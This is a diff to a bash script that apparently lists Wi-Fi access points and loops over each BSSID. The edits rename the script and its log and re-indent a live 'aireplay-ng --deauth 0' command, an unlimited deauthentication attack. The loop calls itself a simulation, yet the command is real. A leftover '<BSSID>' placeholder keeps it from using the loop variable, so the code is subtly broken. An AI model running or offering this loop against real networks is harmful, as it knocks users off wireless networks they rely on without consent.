@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# Usage: sudo ./loop_targets_simulate.sh <interface> <airodump_seconds> <outdir>
-# Example: sudo ./loop_targets_simulate.sh wlan1 20 ./out
+# Usage: sudo ./script.sh <interface> <airodump_seconds> <outdir>
+# Example: sudo ./script.sh wlan1 20 ./out
 
 set -euo pipefail
 
@@ -61,7 +61,7 @@ echo "=== Targets found (`echo "$AP_LIST" | wc -l` APs) ==="
 echo "$AP_LIST"
 echo
 
-LOGFILE="$OUTDIR/loop_simulate.log"
+LOGFILE="$OUTDIR/log.log"
 echo "[*] Logging activity to $LOGFILE"
 echo "loop run at $(date)" >> "$LOGFILE"
 
@@ -69,9 +69,8 @@ echo "loop run at $(date)" >> "$LOGFILE"
 for bssid in $AP_LIST; do
   echo "Would target BSSID: $bssid"
   echo "$(date +'%F %T') | BSSID=$bssid" >> "$LOGFILE"
-
-# this is the deauth command:
-aireplay-ng --deauth 0 -a <BSSID> "$IFACE"
+  # this is the deauth command:
+  aireplay-ng --deauth 0 -a <BSSID> "$IFACE"
 
   # small sleep so loop is visible and not too aggressive
   sleep 0.5
@@ -79,3 +78,4 @@ done
 
 echo
 echo "[*]  complete. Check $LOGFILE for details."
+
